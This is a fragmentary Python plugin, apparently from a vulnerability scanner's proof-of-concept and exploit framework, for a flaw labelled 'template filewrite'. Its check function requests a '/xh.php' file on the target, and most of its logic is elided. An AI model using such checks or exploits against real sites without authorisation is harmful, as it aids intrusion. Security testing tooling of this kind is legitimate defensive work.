...
def vuln_info():
    info={
        'vuln_name': 'templalte filewrite',  #漏洞名称
...
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    try:
        ...
        rp = requests.get(url + "/xh.php",headers=heads,verify=False)
...
def do_exp(url, hostname, port, scheme, heads=None, exp_data=None, func_out=print):
    if exp_data is None:
        exp_data = {}
    if heads is None:
        heads = {}
